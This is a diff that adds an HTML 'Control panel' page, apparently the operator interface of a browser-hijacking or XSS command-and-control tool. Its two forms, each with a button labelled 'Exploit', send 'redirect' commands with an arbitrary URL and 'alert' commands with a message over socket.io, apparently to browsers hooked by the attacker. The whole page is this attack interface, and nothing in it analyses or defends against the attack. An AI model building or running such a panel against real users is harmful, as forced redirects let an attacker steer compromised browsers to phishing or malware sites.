@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control panel</title>
+    <link rel="stylesheet" href="admin.css">
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+</head>
+<body>
+      <center>
+        <h1>Admin Page</h1>
+
+        <form class="link" id="redirectForm">
+            <label for="url">Enter url for redirect : </label>
+            <input type="text" name="url" id="url" placeholder="Link">
+            <button type="submit">Exploit</button>
+        </form>
+        <br>
+        <hr>
+        <form id="alertForm">
+          <label for="alertMessage">Enter Alert Message:</label>
+          <input type="text" name="alertMessage" id="alertMessage" placeholder="Message">
+          <button type="submit">Exploit</button>
+        </form>
+        <br>
+        <hr>
+      </center>
+      <script>
+        var socket = io.connect(window.location.protocol + '//' + window.location.host);
+        document.getElementById('redirectForm').onsubmit = function(event){
+            event.preventDefault();
+            var url = document.getElementById('url').value;
+            socket.emit('message',{command:'redirect',url:url});
+        };
+
+        document.getElementById('alertForm').onsubmit = function(event){
+          event.preventDefault();
+          var message = document.getElementById('alertMessage').value;
+          socket.emit('message',{command: 'alert',message:message})
+        };
+
+      </script>
+</body>
+</html>
